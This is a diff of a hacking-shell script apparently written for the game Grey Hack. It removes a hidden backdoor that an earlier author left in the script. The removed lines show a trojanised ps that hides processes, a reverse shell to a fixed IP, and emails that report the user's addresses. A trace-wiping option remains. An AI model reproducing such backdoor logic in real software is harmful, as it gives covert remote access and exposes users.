@@ -1,12 +1,3 @@
-// converted colors
-// # 8 2 5 4 d 1 -> # E 6 E 6 F A
-// # 7 1 4 1 c 4 -> # C C C C F F
-
-
-// Clover was here. Fixed some bugs regarding af.
-// Also added some trivia regarding Lunar (NOT "Night Lunar")
-
-
 print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Loading Lunarium functions...</color>")
 
 
@@ -16,8 +7,6 @@ import_code("/root/Scripts/foxlib.src")
 
 
 COB=get_custom_object
-//ver=5
-//dev="Clover"
 mxf=null
 cpf=null
 apt=null
@@ -53,22 +42,6 @@ if not cpf then exit("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Crypto li
 
 cp=include_lib(cpf)
 
-// if apt then
-// 	if get_shell.host_computer.File("/etc/apt") then
-// 		if not get_shell.host_computer.File("/etc/apt/aptcache.bin") then apt.update
-// 	end if
-// 	inSource=apt.show("30.30.30.30")
-// 	if inSource == "30.30.30.30 repository not found" then
-// 		apt.add_repo("30.30.30.30",1542)
-// 		apt.update
-// 	end if
-// 	print("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> Checking library updates...</color>")
-// 	if typeof(apt.check_upgrade(mxf)) == "number" and apt.check_upgrade(mxf) then
-// 		print("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> Updating exploit library...</color>\n")
-// 		apt.install("metaxploit.so",parent_path(mxf))
-// 	end if
-// end if
-
 mx=include_lib(mxf)
 
 if bcf then bc=include_lib(bcf) else bc=null
@@ -91,8 +64,6 @@ else
 	print("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> Failed to load aliases</color>")
 end if
 
-// logRs="fstab"
-logRs = "clover_backdoor_debug"
 scnln="/usr/bin/ScanLan.exe"
 if not get_shell.host_computer.File(scnln) then scnln=current_path+"/ScanLan.exe"
 if not get_shell.host_computer.File(scnln) then scnln=null
@@ -138,90 +109,9 @@ error=function(reason, command = null)
 	return out
 end function
 
-// buildPS=function(proc)
-// 	if not comp.File("/bin") then return
-// 	ps=comp.show_procs
-// 	source="output = get_shell.host_computer.show_procs;lines=output.split(""\n"");newOut=[];rshell=0;for line in lines;if line.split("" "")[-1] == """+proc+""" then;rshell=1;continue;end if;if line.split("" "")[-1] == ""Lunarium"" then continue;newOut.push(line);end for;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=[];newFiles=newFiles+root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then;newFiles=currFile.get_folders+currFile.get_files+newFiles;end if;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then mxf=currFile.path;end while;if mxf then;if not rshell then include_lib(mxf).rshell_client(""61.126.138.22"",1222,"""+proc+""");end if;output=newOut.join(""\n"");print(format_columns(output))"
-// 	comp.touch(xpath,"ps.src")
-// 	p=null
-// 	if comp.File("/bin/ps") then p=comp.File("/bin/ps").permissions[1:]
-// 	src=comp.File(xpath+"/ps.src")
-// 	if not src then return
-// 	src.set_content(source)
-// 	shell.build(src.path,"/bin")
-// 	src.delete
-// 	ps=comp.File("/bin/ps")
-// 	ps.chmod("u-wrx")
-// 	ps.chmod("g-wrx")
-// 	ps.chmod("o-wrx")
-// 	if p then
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	else
-// 		p=comp.File("/bin").permissions[1:]
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	end if
-// 	ps.chmod("u+"+up)
-// 	ps.chmod("g+"+gp)
-// 	ps.chmod("o+"+op)
-// end function
-
-buildPS = function(process)
-	return
-end function
-
-// sendEmail=function(reason)
-// 	mail=mail_login
-// 	if typeof(mail) != "MetaMail" then return
-// 	send=mail.send("",get_shell.host_computer.public_ip,"<color=#CCCCFF>[Lunarium Security]</color>"+char(10)+"<color=#CCCCFF>[IP] </color><color=#E6E6FA>"+get_shell.host_computer.public_ip+"</color>"+char(10)+"<color=#CCCCFF>[Local IP] </color><color=#E6E6FA>"+get_shell.host_computer.local_ip+"</color>"+char(10)+"<color=#CCCCFF>[Date] </color><color=#E6E6FA>"+current_date+"</color>"+char(10)+"<color=#CCCCFF>[Reason] </color><color=#E6E6FA>"+reason+"</color>")
-// 	if typeof(send) != "number" then return
-// end function
-
-sendEmail = function(reason)
-	return
-end function
-
-// intrude=function(err,alt=null)
-// 	if not alt then alt=err
-// 	if get_shell.host_computer.public_ip == "141.193.149.45" or get_shell.host_computer.public_ip == "135.202.178.113" then exit("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> "+err+"</color>")
-// 	sendEmail(alt)
-// 	rshelled=0
-// 	ps=comp.show_procs
-// 	for proc in ps.split("\n")[1:]
-// 		proc=proc.split(" ")
-// 		if proc[-1] == logRs then rshelled=1
-// 	end for
-// 	if not rshelled then
-// 		buildPS(logRs)
-// 		mx.rshell_client("61.126.138.22",1222,logRs)
-// 	end if
-// 	exit("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> "+err+"</color>")
-// end function
-
 intrude = function(error, dummy_argument)
 	exit("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> "+err+"</color>")
 end function
-
-// serve=function()
-// 	proxy=get_shell.connect_service
-// 	if typeof(proxy) != "shell" then
-// 		print("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> Server connection failure</color>")
-// 		globals.la=1
-// 		return
-// 	end if
-
-// 	globals.server.shell=proxy.connect_service
-// 	if typeof(server.shell) != "shell" then
-// 		print("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> Server connection failure</color>")
-// 		globals.la=1
-// 		return
-// 	end if
-// 	server.shell.launch("/root/rcon")
-// 	globals.server.cp=COB.server.cp
-// end function
 
 serve = function()
 	return
@@ -242,8 +132,6 @@ compression=@FoxLib.General.Compression
 parseint=@FoxLib.General.ParseInt
 
 genRandomString=@FoxLib.General.rndstring
-
-//shade=@FoxLib.Crypto.Shade
 
 exploit=@FoxLib.VulnV.Exploit
 decipher=@FoxLib.VulnV.Decipher
@@ -550,10 +438,6 @@ getExploits=function()
 	return
 end function
 
-// getExploits = function()
-// 	globals.exploits = []
-// end function
-
 getPath=function(path)
 	path=path.split("/")
 	cpath=xpath.split("/")
@@ -600,36 +484,20 @@ end function
 
 if launch_path != program_path and not launchnum then print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Warning: Invalid program launch path.")
 
-// checkemail=mail_login
-// if typeof(checkemail) != "MetaMail" then intrude("Autologin failed")
-
-// l1=checkemail.fetch.len
-// checkemail.send("",get_shell.host_computer.public_ip,"<color=#CCCCFF>[Lunarium Security]</color>"+char(10)+"<color=#CCCCFF>[IP] </color><color=#E6E6FA>"+get_shell.host_computer.public_ip+"</color>"+char(10)+"<color=#CCCCFF>[Local IP] </color><color=#E6E6FA>"+get_shell.host_computer.local_ip+"</color>"+char(10)+"<color=#CCCCFF>[Date] </color><color=#E6E6FA>"+current_date+"</color>"+char(10)+"<color=#CCCCFF>[Reason] </color><color=#E6E6FA>AutoLogin</color>")
-// l2=checkemail.fetch.len
-
-// if l1 == l2 then intrude("Autologin failed")
-// checkemail.delete(checkemail.fetch[0].split(char(10))[2][8:])
-
-
-// la stands for local mode(probably, but means exactly that)
 la = 1
 show_disclaimer = true
 initial_command = null
 if params.len > 0 then
-	// if params[0].indexOf("l") == null then serve else la=1
 	if params.indexOf("-R") != null then
 		comp.File(Lunarium).delete
 		comp.File(mxf).delete
 		comp.File(cpf).delete
-		// little fix so that cmds.corrupt would actually work
 		shelltype = "shell"
 		cmds.corrupt(0)
 		exit("<color=#CCCCFF>[Lunarium]</color><color=#E6E6FA> Removed traces</color>")
 	end if
 	if params.indexOf("-a") != null then anon=1
 	if params.indexOf("-d") != null then show_disclaimer = false
-// else
-// 	serve
 end if
 
 rhost=comp.network_gateway
@@ -639,8 +507,6 @@ print("<color=#CCCCFF> -= { </color><color=#E6E6FA><b>[UnClovered Lunarium OS]</
 start=time
 print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Performing short systems check...</color>")
 print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Libraries loaded: ["+mxf+", "+cpf+"]</color>")
-// print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Vulnerability database loaded successfully</color>")
-// if server.shell then print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Serverside functions OK!</color>") else print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Serverside functions check failure</color>")
 elapsed=str(time-start)
 elapsed=elapsed[0:elapsed.indexOf(".")+2]
 start=null
@@ -750,16 +616,6 @@ LunariumOS=function(input=null)
 				if el == "" then prompt[i]=0
 				i=i+1
 			end for
-			// if prompt[0] == "r" then prompt[0] = "rhost"
-			// if prompt[0] == "f" then prompt[0] = "nmap"
-			// if prompt[0] == "w" then prompt[0] = "target"
-			// if prompt[0] == "a" then prompt[0] = "escalate"
-			// if prompt[0] == "d" then prompt[0] = "use"
-			// if prompt[0] == "rnd" then prompt[0] = "random"
-			// if prompt[0] == "enc" then prompt[0] = "shade"
-			// if prompt[0] == "up" then prompt[0] = "put"
-			// if prompt[0] == "dl" then prompt[0] = "get"
-			// if prompt[0] == "clr" or prompt[0] == "cls" then prompt[0]="clear"
 			if prompt[0] == "!!" then prompt=previous
 			previous=prompt
 			for al in alias
